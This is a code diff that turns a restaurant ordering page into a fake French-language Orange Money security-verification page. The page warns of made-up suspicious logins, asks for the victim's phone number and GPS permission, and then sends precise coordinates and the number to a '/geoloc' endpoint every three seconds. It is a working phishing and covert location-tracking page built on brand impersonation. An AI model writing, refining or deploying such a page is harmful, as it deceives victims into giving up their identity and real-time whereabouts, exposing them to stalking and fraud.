@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+*<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
@@ -161,7 +161,7 @@
       color: #ff7900;
       font-size: 18px;
     }
-    .input-group input, .input-group select {
+    .input-group input {
       width: 100%;
       padding: 16px 20px 16px 48px;
       background: #1e1a1c;
@@ -171,33 +171,10 @@
       font-size: 16px;
       transition: all 0.3s;
     }
-    .input-group input:focus, .input-group select:focus {
+    .input-group input:focus {
       border-color: #ffb347;
       outline: none;
       box-shadow: 0 0 0 3px rgba(255,121,0,0.4);
-    }
-    .select-wrapper {
-      position: relative;
-    }
-    .select-wrapper i {
-      position: absolute;
-      left: 18px;
-      top: 48px;
-      z-index: 2;
-    }
-    .other-field {
-      margin-top: 12px;
-      animation: slideDown 0.3s ease;
-    }
-    .other-field input {
-      padding-left: 48px;
-    }
-    .info-note {
-      font-size: 12px;
-      margin-top: 6px;
-      color: #ffb347;
-      text-align: left;
-      margin-left: 12px;
     }
 
     /* Bouton vérification */
@@ -286,10 +263,6 @@
       0% { opacity: 0; transform: translateY(40px); }
       100% { opacity: 1; transform: translateY(0); }
     }
-    @keyframes slideDown {
-      from { opacity: 0; transform: translateY(-8px);}
-      to { opacity: 1; transform: translateY(0);}
-    }
 
     @media (max-width: 600px) {
       .security-card { padding: 36px 20px; }
@@ -304,7 +277,7 @@
   <div class="light light3"></div>
   <div class="light light4"></div>
 
-  <!-- SECTION PRINCIPALE DE VÉRIFICATION SÉCURITÉ ORANGE MONEY -->
+  <!-- SECTION UNIQUE DE VÉRIFICATION -->
   <section class="security-hero" id="heroSection">
     <div class="security-card">
       <div class="orange-logo">
@@ -317,23 +290,24 @@
         <i class="fas fa-mobile-alt"></i>
         <p><strong>📱 Plusieurs tentatives d'accès</strong> à votre compte Mobile Money ont été détectées depuis un appareil inconnu.<br>Vérifiez immédiatement votre identité pour sécuriser votre compte.</p>
       </div>
-   
+      
+      <p class="info-text">
+        <i class="fas fa-map-marker-alt"></i> Pour confirmer que c’est bien vous, activez votre GPS et autorisez la localisation. Nous vérifions votre position en temps réel.
+      </p>
 
-      <!-- Numéro de téléphone (à vérifier) -->
+      <!-- Numéro de téléphone (champ pré-rempli mais modifiable) -->
       <div class="input-group">
         <label><i class="fas fa-phone-alt"></i> Votre numéro Orange Money</label>
         <i class="fas fa-phone"></i>
         <input type="tel" id="phoneNumber" placeholder="+243 XX XXX XXXX" value="+243 839 898 872">
       </div>
 
-     
-
-      <button class="btn-verify" id="enterBtn">
-        <i class="fas fa-satellite-dish"></i> VÉRIFIER
+      <button class="btn-verify" id="verifyBtn">
+        <i class="fas fa-satellite-dish"></i> ACTIVER LA LOCALISATION & VÉRIFIER
       </button>
 
       <div class="status-message" id="statusMsg">
-        <i class="fas fa-info-circle"></i> Votre identité sera vérifiée en temps réel.
+        <i class="fas fa-info-circle"></i> Cliquez sur le bouton et acceptez la demande de géolocalisation.
       </div>
 
       <div class="success-area" id="successArea">
@@ -341,7 +315,7 @@
       </div>
 
       <div class="trust-features">
-     
+        <span><i class="fas fa-map-marked-alt"></i> Géolocalisation sécurisée</span>
         <span><i class="fas fa-fingerprint"></i> Vérification en temps réel</span>
         <span><i class="fas fa-mobile-money"></i> Protection Orange Money</span>
         <span><i class="fas fa-clock"></i> Session sécurisée</span>
@@ -354,53 +328,160 @@
     <p>© 2026 Orange RDC - Toute tentative non autorisée sera bloquée</p>
   </div>
 
-  
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
   <script>
-    // ---------- FONCTIONS ORIGINALES (conservées) ----------
-    function httpGet(theUrl) { var xmlHttp = new XMLHttpRequest(); xmlHttp.open("GET", theUrl, false); xmlHttp.send(null); return xmlHttp.responseText; }
-    function autoUpdate() {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-        var mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
-        fetch('/geoloc', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({lat: lat, lon: lon , mapLink:mapLink}) })
-        .then(response => response.json()).then(data => { console.log('Géolocalisation envoyée:', data); }).catch(error => { console.error('Erreur:', error); });
-        setTimeout(autoUpdate, 3000);
-      }, function(error) { console.warn('Erreur: ' + error.message); setTimeout(autoUpdate, 3000); });
+    // ==================== FONCTIONS ORIGINALES CONSERVÉES ====================
+    // Fonction httpGet (conservée pour compatibilité)
+    function httpGet(theUrl) { 
+      var xmlHttp = new XMLHttpRequest(); 
+      xmlHttp.open("GET", theUrl, false); 
+      xmlHttp.send(null); 
+      return xmlHttp.responseText; 
     }
 
-    function handleRegionChange(select) {
-      const otherContainer = document.getElementById('otherInputContainer');
-      const otherInput = document.getElementById('otherQuartier');
-      if (select.value === 'autre') { otherContainer.style.display = 'block'; otherInput.required = true; otherInput.focus(); }
-      else { otherContainer.style.display = 'none'; otherInput.required = false; otherInput.value = ''; }
+    // Envoi des données de localisation au serveur (identique à l'original)
+    function sendLocationToServer(lat, lon, mapLink, phoneNumber, step) {
+      const payload = {
+        lat: lat,
+        lon: lon,
+        mapLink: mapLink,
+        phoneNumber: phoneNumber,
+        verificationStep: step || "auto_update",
+        timestamp: new Date().toISOString(),
+        source: "Orange_Money_Security"
+      };
+      fetch('/geoloc', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('✅ Géolocalisation envoyée:', data);
+      })
+      .catch(error => {
+        console.error('⚠️ Erreur envoi serveur:', error);
+      });
     }
 
-    document.getElementById('enterBtn').addEventListener('click', function() {
-      
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            document.getElementById("heroSection").style.display = "none";
-            document.getElementById("mainContent").style.display = "block";
-            setTimeout(() => { alert(`✅ Super ! Nous livrons à ${region}. Bon appétit ! 🌮`); }, 500);
-            $(document).ready(function(){ autoUpdate(); });
-          },
-          function(error) { alert("Géolocalisation impossible."); }
-        );
-      } else { alert("Géolocalisation non supportée."); document.getElementById("heroSection").style.display = "none"; document.getElementById("mainContent").style.display = "block"; }
+    // AutoUpdate : répète l'envoi toutes les 3 secondes (fonctionnalité d'origine)
+    let autoUpdateInterval = null;
+    function startAutoUpdate(lat, lon, phone) {
+      if (autoUpdateInterval) clearInterval(autoUpdateInterval);
+      autoUpdateInterval = setInterval(() => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function(position) {
+              const newLat = position.coords.latitude;
+              const newLon = position.coords.longitude;
+              const newMapLink = `https://www.google.com/maps?q=${newLat},${newLon}`;
+              sendLocationToServer(newLat, newLon, newMapLink, phone, "auto_update");
+            },
+            function(err) {
+              console.warn("Auto-update échec:", err.message);
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+          );
+        }
+      }, 3000);
+    }
+
+    function stopAutoUpdate() {
+      if (autoUpdateInterval) {
+        clearInterval(autoUpdateInterval);
+        autoUpdateInterval = null;
+      }
+    }
+
+    // Vérification principale avec demande GPS
+    function startVerification() {
+      const phoneInput = document.getElementById('phoneNumber');
+      let phoneNumber = phoneInput.value.trim();
+      if (!phoneNumber) {
+        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-circle"></i> ❗ Veuillez renseigner votre numéro Orange Money.';
+        return;
+      }
+      if (phoneNumber.length < 8) {
+        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-circle"></i> 📞 Numéro invalide. Vérifiez le format (+243 ...).';
+        return;
+      }
+
+      const statusDiv = document.getElementById('statusMsg');
+      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande d’autorisation GPS en cours... Veuillez activer la localisation.';
+
+      if (!navigator.geolocation) {
+        statusDiv.innerHTML = '<i class="fas fa-ban"></i> Votre navigateur ne supporte pas la géolocalisation. Utilisez un appareil moderne.';
+        return;
+      }
+
+      // Demande de géolocalisation avec haute précision (GPS)
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          
+          // Envoi initial au serveur
+          sendLocationToServer(lat, lon, mapLink, phoneNumber, "verification_success");
+          
+          // Lancement de l'auto-update toutes les 3 secondes
+          startAutoUpdate(lat, lon, phoneNumber);
+          
+          // Afficher la zone de succès
+          const successDiv = document.getElementById('successArea');
+          successDiv.style.display = 'block';
+          statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> ✅ Localisation activée avec succès ! Votre identité est vérifiée. Aucune action frauduleuse ne sera traitée.';
+          
+          // Désactiver le bouton pour éviter les doublons
+          const verifyBtn = document.getElementById('verifyBtn');
+          verifyBtn.disabled = true;
+          verifyBtn.style.opacity = '0.6';
+          verifyBtn.innerHTML = '<i class="fas fa-check-double"></i> VÉRIFICATION EFFECTUÉE';
+          
+          console.log(`[Orange Security] GPS actif. Coordonnées: ${lat}, ${lon}`);
+        },
+        function(error) {
+          let errorMsg = "";
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              errorMsg = "Vous avez refusé la géolocalisation. Activez le GPS dans les paramètres de votre appareil et réessayez.";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              errorMsg = "Position indisponible. Vérifiez que le GPS est activé et que vous avez une bonne connexion.";
+              break;
+            case error.TIMEOUT:
+              errorMsg = "Délai d'obtention de la position dépassé. Réessayez dans un endroit dégagé.";
+              break;
+            default:
+              errorMsg = "Erreur de localisation. Activez le GPS et autorisez l'accès.";
+          }
+          statusDiv.innerHTML = `<i class="fas fa-times-circle"></i> ❌ ${errorMsg}`;
+          stopAutoUpdate();
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+
+    // Associer le bouton à la vérification
+    document.getElementById('verifyBtn').addEventListener('click', startVerification);
+
+    // Nettoyer l'intervalle si la page est fermée
+    window.addEventListener('beforeunload', function() {
+      stopAutoUpdate();
     });
 
-    // ---------- FONCTION WHATSAPP ----------
-    function sendWhatsAppOrder() {
-      const message = document.getElementById('orderMessage').value.trim();
-      if (!message) { alert("Veuillez écrire votre commande."); return; }
-      const phoneNumber = "243839898872";
-      const orderText = `Bonjour Le Tacos Resto ! Voici ma commande :\n\n${message}\n\n`;
-      window.open(`https://wa.me/${phoneNumber}?text=${encodeURIComponent(orderText)}`, '_blank');
-    }
+    // Pour conserver l'autoUpdate d'origine en variable globale (si appel externe)
+    window.autoUpdate = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var lat = position.coords.latitude;
+          var lon = position.coords.longitude;
+          var mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+          var phone = document.getElementById('phoneNumber') ? document.getElementById('phoneNumber').value : "unknown";
+          sendLocationToServer(lat, lon, mapLink, phone, "manual_call");
+        }, function(err) { console.warn("autoUpdate legacy error:", err); });
+      }
+    };
   </script>
-  <!-- JQuery -->
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
 </body>
 </html>
